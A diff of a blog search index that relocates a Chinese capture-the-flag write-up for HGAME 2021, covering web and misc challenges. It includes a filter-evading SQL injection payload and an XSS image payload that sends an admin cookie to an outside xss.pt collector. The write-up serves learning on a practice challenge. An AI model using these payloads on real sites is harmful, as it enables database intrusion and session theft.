@@ -268,6 +268,82 @@
       </categories>
   </entry>
   <entry>
+    <title>HGAME 2021 WP</title>
+    <url>/2021/03/02/hgame2021wp/</url>
+    <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>网页代码中提示要把得到的信息放在<code>HEAD tag</code>中，所以猜测应该是修改http头部。</p>
+<p>先直接访问<code>HitchhikerGuide.php</code>，405错误，应该是请求方法不对，把GET改为POST，成功得到提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>这里我想了好久是什么意思，百度查了半天这个东西是什么意思，后来开窍了，HGAME的思路就是要中二，所以它就是一个浏览器，直接代替Firefox就行。后面跟着步骤修改头部信息就好。以下是完整头部修改结果：
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/1.png"></p>
+<p>得到flag。</p>
+<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>没想到思路 ，在project.js里翻了半天，最终找到了base64编码的flag，应该不是预期解。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gameOverShowText: function (e, t) &#123;</span><br><span class="line">	if(e &gt; 1999)&#123;</span><br><span class="line">		alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>在fuckmath.js中可以看到代码，直接尝试访问<code>/api/getFlag</code>来getFlag后得到一个假flag，还被出题师傅嘲讽了一番。。。</p>
+<p>我猜这道题的解法应该是在console里修改solving的值为100，可是我看不怎么懂js，更不会用console，瞎试了半天也没试出来。</p>
+<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>开始一点都不会，网址还老崩，后来下线再上线后给了hint，原来是http走私啊。一波学习以后成功解出：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/2.png"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>签到题，先base64再base32再base16解码得到flag。</p>
+<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><blockquote>
+<p>学到的知识：</p>
+<p>​        加密压缩包的一般处理方法：爆破、伪加密、明文攻击、CRC32碰撞</p>
+<p>reference：<a href="https://www.cnblogs.com/leixiao-/p/9824557.html">https://www.cnblogs.com/leixiao-/p/9824557.html</a></p>
+<p>reference：<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p>
+</blockquote>
+<p>得到一张图片，保存下来后用二进制编辑器打开，结尾有<code>.zip</code>格式的文件和一句提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure>
+
+<p>百度查图片id得到的消息都是p站图片id，结合猜测这是p站的图，找到原图即可。百度识图得到原图id得到密码，原文件修改成<code>.zip</code>后解压得到新的<code>.zip</code>和提示：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure>
+
+<p>刚开始我根据提示猜测是伪加密，后来发现行不通。</p>
+<p>之后查各种压缩包的处理方法，知道了明文攻击，才明白了提示的意思。</p>
+<p>将我们已知的txt文件压缩，只是用storage算法压缩，然后用ARCHPR进行明文攻击。</p>
+<p>在这里卡了很久，主要是由于很多压缩软件的压缩方法都不对，ARCHPR一直报错，卡了很久，最后用winRAR成功了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/3.png"></p>
+<p>打开之后还有一个加密压缩包，用二进制打开，看到很有规律的重复，猜测是某种编码。开始觉得是16进制，后来发现不大对，试了一堆之后发现是unicode，还需要自己补零。下面这里打错了，重复了一次 <code>_i5</code> 。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/4.png"></p>
+<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><blockquote>
+<p>学到的知识：</p>
+<p>​        <code>.pcapng</code>格式文件的作用与处理方法；图片的一般隐写思路。</p>
+<p>reference：<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>
+<p>reference：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a></p>
+</blockquote>
+<p>下载文件，发现是一个<code>.pcapng</code>格式的文件。使用wireshark工具打开，发现大量192.168.43.146与192.168.43.199的握手，在其中抓到了<code>galaxy.png</code>，将其导出后，发现图片既不是压缩包，也没有藏图像，猜测是修改高度来隐写的。将高由3296修改成3496，flag出现。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/5.png"></p>
+<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>文件是两个docx文档，一个上锁了，另一个打开之后没什么信息，后缀改为<code>.zip</code>后找到一个<code>password.xml</code>的文件，看格式可以知道是brianfuck密码，解密后得到密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOWHIDDEN?</span><br></pre></td></tr></table></figure>
+
+<p>打开第二个docx文档，由于密码的提示，我们在word选项里显示隐藏的文字，出现了几排空格。改成<code>.zip</code>里面有一堆我也不知道有啥用的文件。用十六进制编辑器打开看，发现结尾有brianfuck密码，应该就是对应那段空格。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/6.png"></p>
+<p>但是解密我解不出来，显示错误，而且如果是这样，第一处解出来的密码有什么用呢？卡在这里了。</p>
+<p>新思路：之前这个应该就是文档的密码而已，之前所谓的几排空格将其复制后粘贴到sublime里，看到了近似摩斯密码的文本，可是又不完全符合摩斯密码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/7.png"></p>
+<p>啊我裂开，看了官方wp后才知道是snow隐写，题目图片给的提示被我忽略了，主要还是见得少，多长长见识吧。</p>
+<hr>
+<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="200ok"><a href="#200ok" class="headerlink" title="200ok!"></a>200ok!</h3><p>该题考查sql注入。</p>
+<p>注入点是在header的status字段，这一点我没有验证出来；屏蔽了一些词和空格，我们用大小写绕过，空格用<code>/**/</code>来代替。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Status: -1&#39; uniOn&#x2F;**&#x2F;seLect&#x2F;**&#x2F;ffffff14gggggg&#x2F;**&#x2F;fRom&#x2F;**&#x2F;f1111111144444444444g;#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><p>这道题基本可以看出是XSS的考查，POST恶意代码，将其提交后得到管理员的cookie再用token访问<code>/flag</code>即可。</p>
+<p>经过尝试，<code>script</code>会被转换成<code>div</code>，可以用img标签，部分关键词双写绕过，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Img sRC&#x3D;hthttptps:&#x2F;&#x2F;xss.pt&#x2F;vhFCp.jpg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可是我的xss平台总是拿不到cookie，换了很多个平台也没用，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/8.png"></p>
+<p>到现在也不知道为什么。。。</p>
+]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+  </entry>
+  <entry>
     <title>文件包含漏洞&amp;伪协议总结</title>
     <url>/2021/01/02/php3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结文件包含漏洞和伪协议相关知识。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
@@ -772,82 +848,6 @@
 ]]></content>
       <categories>
         <category>XXE</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>HGAME 2021 WP</title>
-    <url>/2021/03/02/hgame2021wp/</url>
-    <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>网页代码中提示要把得到的信息放在<code>HEAD tag</code>中，所以猜测应该是修改http头部。</p>
-<p>先直接访问<code>HitchhikerGuide.php</code>，405错误，应该是请求方法不对，把GET改为POST，成功得到提示：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>
-
-<a id="more"></a>这里我想了好久是什么意思，百度查了半天这个东西是什么意思，后来开窍了，HGAME的思路就是要中二，所以它就是一个浏览器，直接代替Firefox就行。后面跟着步骤修改头部信息就好。以下是完整头部修改结果：
-
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/1.png"></p>
-<p>得到flag。</p>
-<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>没想到思路 ，在project.js里翻了半天，最终找到了base64编码的flag，应该不是预期解。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gameOverShowText: function (e, t) &#123;</span><br><span class="line">	if(e &gt; 1999)&#123;</span><br><span class="line">		alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>在fuckmath.js中可以看到代码，直接尝试访问<code>/api/getFlag</code>来getFlag后得到一个假flag，还被出题师傅嘲讽了一番。。。</p>
-<p>我猜这道题的解法应该是在console里修改solving的值为100，可是我看不怎么懂js，更不会用console，瞎试了半天也没试出来。</p>
-<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>开始一点都不会，网址还老崩，后来下线再上线后给了hint，原来是http走私啊。一波学习以后成功解出：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/2.png"></p>
-<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>签到题，先base64再base32再base16解码得到flag。</p>
-<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><blockquote>
-<p>学到的知识：</p>
-<p>​        加密压缩包的一般处理方法：爆破、伪加密、明文攻击、CRC32碰撞</p>
-<p>reference：<a href="https://www.cnblogs.com/leixiao-/p/9824557.html">https://www.cnblogs.com/leixiao-/p/9824557.html</a></p>
-<p>reference：<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p>
-</blockquote>
-<p>得到一张图片，保存下来后用二进制编辑器打开，结尾有<code>.zip</code>格式的文件和一句提示：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure>
-
-<p>百度查图片id得到的消息都是p站图片id，结合猜测这是p站的图，找到原图即可。百度识图得到原图id得到密码，原文件修改成<code>.zip</code>后解压得到新的<code>.zip</code>和提示：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure>
-
-<p>刚开始我根据提示猜测是伪加密，后来发现行不通。</p>
-<p>之后查各种压缩包的处理方法，知道了明文攻击，才明白了提示的意思。</p>
-<p>将我们已知的txt文件压缩，只是用storage算法压缩，然后用ARCHPR进行明文攻击。</p>
-<p>在这里卡了很久，主要是由于很多压缩软件的压缩方法都不对，ARCHPR一直报错，卡了很久，最后用winRAR成功了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/3.png"></p>
-<p>打开之后还有一个加密压缩包，用二进制打开，看到很有规律的重复，猜测是某种编码。开始觉得是16进制，后来发现不大对，试了一堆之后发现是unicode，还需要自己补零。下面这里打错了，重复了一次 <code>_i5</code> 。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/4.png"></p>
-<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><blockquote>
-<p>学到的知识：</p>
-<p>​        <code>.pcapng</code>格式文件的作用与处理方法；图片的一般隐写思路。</p>
-<p>reference：<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>
-<p>reference：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a></p>
-</blockquote>
-<p>下载文件，发现是一个<code>.pcapng</code>格式的文件。使用wireshark工具打开，发现大量192.168.43.146与192.168.43.199的握手，在其中抓到了<code>galaxy.png</code>，将其导出后，发现图片既不是压缩包，也没有藏图像，猜测是修改高度来隐写的。将高由3296修改成3496，flag出现。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/5.png"></p>
-<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>文件是两个docx文档，一个上锁了，另一个打开之后没什么信息，后缀改为<code>.zip</code>后找到一个<code>password.xml</code>的文件，看格式可以知道是brianfuck密码，解密后得到密码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOWHIDDEN?</span><br></pre></td></tr></table></figure>
-
-<p>打开第二个docx文档，由于密码的提示，我们在word选项里显示隐藏的文字，出现了几排空格。改成<code>.zip</code>里面有一堆我也不知道有啥用的文件。用十六进制编辑器打开看，发现结尾有brianfuck密码，应该就是对应那段空格。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/6.png"></p>
-<p>但是解密我解不出来，显示错误，而且如果是这样，第一处解出来的密码有什么用呢？卡在这里了。</p>
-<p>新思路：之前这个应该就是文档的密码而已，之前所谓的几排空格将其复制后粘贴到sublime里，看到了近似摩斯密码的文本，可是又不完全符合摩斯密码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/7.png"></p>
-<p>啊我裂开，看了官方wp后才知道是snow隐写，题目图片给的提示被我忽略了，主要还是见得少，多长长见识吧。</p>
-<hr>
-<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="200ok"><a href="#200ok" class="headerlink" title="200ok!"></a>200ok!</h3><p>该题考查sql注入。</p>
-<p>注入点是在header的status字段，这一点我没有验证出来；屏蔽了一些词和空格，我们用大小写绕过，空格用<code>/**/</code>来代替。</p>
-<p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Status: -1&#39; uniOn&#x2F;**&#x2F;seLect&#x2F;**&#x2F;ffffff14gggggg&#x2F;**&#x2F;fRom&#x2F;**&#x2F;f1111111144444444444g;#</span><br></pre></td></tr></table></figure>
-
-<p>得到flag。</p>
-<h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><p>这道题基本可以看出是XSS的考查，POST恶意代码，将其提交后得到管理员的cookie再用token访问<code>/flag</code>即可。</p>
-<p>经过尝试，<code>script</code>会被转换成<code>div</code>，可以用img标签，部分关键词双写绕过，如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Img sRC&#x3D;hthttptps:&#x2F;&#x2F;xss.pt&#x2F;vhFCp.jpg&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可是我的xss平台总是拿不到cookie，换了很多个平台也没用，如下图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/8.png"></p>
-<p>到现在也不知道为什么。。。</p>
-]]></content>
-      <categories>
-        <category>WP</category>
       </categories>
   </entry>
   <entry>
